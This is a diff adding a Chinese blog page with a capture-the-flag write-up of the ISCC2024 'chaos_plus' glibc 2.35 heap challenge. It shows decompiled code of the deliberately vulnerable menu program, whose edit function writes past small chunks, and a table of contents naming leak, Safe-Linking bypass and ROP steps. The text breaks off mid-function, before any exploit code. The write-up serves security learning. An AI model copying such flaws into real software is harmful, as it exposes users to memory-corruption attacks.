@@ -1,0 +1,600 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_ex15nbittbh';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://idcm-svg.github.io/HFTTC.github.io';window.REIMU_CONFIG.relative = '/HFTTC.github.io/';</script>
+  <title>
+    [ISCC2024]chaos_plus(堆栈结合) | SEZUVEM=&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_ex15nbittbh.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/HFTTC.github.io/css/loader.css">
+
+    <meta name="description" content="[ISCC 2024] chaos_plus(堆栈结合)网上有师傅对 [ISCC 2024] chaos 进行了修改，抬高了 libc 版本至 2.35 并修改了部分函数，思路可以供自己去学习高版本 libc 的堆攻击，也认识了 Safe-Linking  基址机制。总而言之，是一道非常好的题目。 参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;j284886202&#x2F;article&#x2F;deta">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[ISCC2024]chaos_plus(堆栈结合)">
+<meta property="og:url" content="https://idcm-svg.github.io/HFTTC.github.io/2026/04/28/PWN/PWNCTF/glibc-2.35%E6%96%B0%E5%A2%9E%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/%5BISCC2024%5Dchaos_plus(%E5%A0%86%E6%A0%88%E7%BB%93%E5%90%88)/index.html">
+<meta property="og:site_name" content="SEZUVEM&#x3D;&#39;s Blog">
+<meta property="og:description" content="[ISCC 2024] chaos_plus(堆栈结合)网上有师傅对 [ISCC 2024] chaos 进行了修改，抬高了 libc 版本至 2.35 并修改了部分函数，思路可以供自己去学习高版本 libc 的堆攻击，也认识了 Safe-Linking  基址机制。总而言之，是一道非常好的题目。 参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;j284886202&#x2F;article&#x2F;deta">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776690962495-d1289fb8-8078-450a-8350-78d4b1e5de42-753396.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776701633309-60799f92-3c6a-4036-afc6-46c108dd17b0-197626.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776701791315-63d22fea-7184-417d-8685-c78f7363c975-983841.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776702020854-ad25e290-ba98-4992-9c8a-f11cb8b96591-173440.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776773662592-d3c86d65-5371-4d53-9932-967d3e1826e5-245070.png">
+<meta property="og:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776775912191-2797f673-5d09-404c-b803-f092aff83fba-740788.png">
+<meta property="article:published_time" content="2026-04-28T10:25:57.106Z">
+<meta property="article:modified_time" content="2026-04-28T11:22:09.799Z">
+<meta property="article:author" content="SEZUVEM&#x3D;">
+<meta property="article:tag" content="Pwn, CTF, Binary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://idcm-svg.github.io/HFTTC.github.io/img/euXbUyH7hkRDiDqT/1776690962495-d1289fb8-8078-450a-8350-78d4b1e5de42-753396.png">
+      <meta name="keywords" content="Pwn, CTF, Binary">
+    <link rel="alternate" href="/HFTTC.github.io/atom.xml" title="SEZUVEM='s Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/HFTTC.github.io/images/favicon.ico">
+  
+<link rel="stylesheet" href="/HFTTC.github.io/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/HFTTC.github.io/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/HFTTC.github.io/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/HFTTC.github.io/images/banner.webp" alt="[ISCC2024]chaos_plus(堆栈结合)">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">[ISCC2024]chaos_plus(堆栈结合)</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ISCC-2024-chaos-plus-%E5%A0%86%E6%A0%88%E7%BB%93%E5%90%88"><span class="toc-number">1.</span> <span class="toc-text">[ISCC 2024] chaos_plus(堆栈结合)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#chaos-plus-UAF-libc-2-35"><span class="toc-number">1.1.</span> <span class="toc-text">chaos_plus(UAF libc-2.35)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.2.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#menu"><span class="toc-number">1.2.2.</span> <span class="toc-text">menu</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#add"><span class="toc-number">1.2.3.</span> <span class="toc-text">add</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#delete"><span class="toc-number">1.2.4.</span> <span class="toc-text">delete</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#edit"><span class="toc-number">1.2.5.</span> <span class="toc-text">edit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#printf"><span class="toc-number">1.2.6.</span> <span class="toc-text">printf</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">EXP 思路：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%B3%84%E9%9C%B2-Libc-%E5%9F%BA%E5%9D%80-Unsorted-Bin-%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.1.</span> <span class="toc-text">1. 泄露 Libc 基址 (Unsorted Bin 泄露)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B3%84%E9%9C%B2%E5%A0%86%E5%9F%BA%E5%9D%80-%E7%BB%95%E8%BF%87-Safe-Linking"><span class="toc-number">1.3.2.</span> <span class="toc-text">2. 泄露堆基址 (绕过 Safe-Linking)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8%E5%A0%86%E6%BA%A2%E5%87%BA-UAF-%E6%9E%84%E9%80%A0-Chunk-Overlap"><span class="toc-number">1.3.3.</span> <span class="toc-text">3. 利用堆溢出&#x2F;UAF 构造 Chunk Overlap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%B3%84%E9%9C%B2%E6%A0%88%E5%9C%B0%E5%9D%80-%E5%88%A9%E7%94%A8-environ"><span class="toc-number">1.3.4.</span> <span class="toc-text">4. 泄露栈地址 (利用 environ)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E8%AE%A1%E7%AE%97%E6%A0%88%E6%8C%87%E9%92%88"><span class="toc-number">1.3.5.</span> <span class="toc-text">5. 计算栈指针</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%9C%A8%E6%A0%88%E4%B8%8A%E5%B8%83%E7%BD%AE-ROP-%E9%93%BE"><span class="toc-number">1.3.6.</span> <span class="toc-text">6. 在栈上布置 ROP 链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E8%A7%A6%E5%8F%91-ROP"><span class="toc-number">1.3.7.</span> <span class="toc-text">7. 触发 ROP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB-EXP"><span class="toc-number">1.4.</span> <span class="toc-text">总 EXP:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-%E6%BA%90%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">C 源代码：</span></a></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="SEZUVEM=" class="lazyload">
+  <div class="sidebar-author-name">SEZUVEM=</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">198</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-PWN/PWNCTF/glibc-2.35新增保护机制/[ISCC2024]chaos_plus(堆栈结合)" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-04-28T10:25:57.106Z" itemprop="datePublished">2026-04-28</time>
+    <time style="display: none;" id="post-update-time">2026-04-28</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="ISCC-2024-chaos-plus-堆栈结合"><a href="#ISCC-2024-chaos-plus-堆栈结合" class="headerlink" title="[ISCC 2024] chaos_plus(堆栈结合)"></a>[ISCC 2024] chaos_plus(堆栈结合)</h1><p>网上有师傅对 [ISCC 2024] chaos 进行了修改，抬高了 libc 版本至 2.35 并修改了部分函数，思路可以供自己去学习高版本 libc 的堆攻击，也认识了 Safe-Linking  基址机制。总而言之，是一道非常好的题目。</p>
+<p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/j284886202/article/details/139119047">https://blog.csdn.net/j284886202/article/details/139119047</a></p>
+<h3 id="chaos-plus-UAF-libc-2-35"><a href="#chaos-plus-UAF-libc-2-35" class="headerlink" title="chaos_plus(UAF libc-2.35)"></a>chaos_plus(UAF libc-2.35)</h3><p><img src="/HFTTC.github.io/./img/euXbUyH7hkRDiDqT/1776690962495-d1289fb8-8078-450a-8350-78d4b1e5de42-753396.png" alt="1776690962495-d1289fb8-8078-450a-8350-78d4b1e5de42.png"></p>
+<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *p_%d, <span class="type">char</span> **num, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> n4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu((__int64)p_%d, (__int64)num);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Please Choice:&quot;</span>);</span><br><span class="line">      num = (<span class="type">char</span> **)&amp;n4;</span><br><span class="line">      p_%d = <span class="string">&quot;%d&quot;</span>;</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n4);</span><br><span class="line">      <span class="keyword">if</span> ( n4 != <span class="number">4</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( n4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        del();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">menu</span><span class="params">(__int64 p_%d, __int64 p_n4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add Chaos!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Del Chaos!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Edit Chaos!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Print Chaos!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;5.Exit!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> n9; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( n9 = <span class="number">0</span>; ; ++n9 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n9 &gt; <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4060 + n9) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please Input Size:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  *((_QWORD *)&amp;unk_4060 + n9) = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !*((_QWORD *)&amp;unk_4060 + n9) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Content of Chaos!:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_4060 + n9), size);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Successful&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n9; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please Input index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n9);</span><br><span class="line">  <span class="keyword">if</span> ( n9 &lt;= <span class="number">9</span> &amp;&amp; *((_QWORD *)&amp;unk_4060 + n9) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)&amp;unk_4060 + n9));</span><br><span class="line">    *((_QWORD *)&amp;unk_4060 + n9) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> n9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n9; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please Input index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n9);</span><br><span class="line">  <span class="keyword">if</span> ( n9 &lt;= <span class="number">9</span> &amp;&amp; *((_QWORD *)&amp;unk_4060 + n9) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Change Chaos Content:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, *((<span class="type">void</span> **)&amp;unk_4060 + n9), <span class="number">0x20u</span>);</span><br><span class="line">    <span class="keyword">return</span> n9;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFFL</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">printf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> n9; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please Input index:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n9);</span><br><span class="line">  <span class="keyword">if</span> ( n9 &lt;= <span class="number">9</span> &amp;&amp; 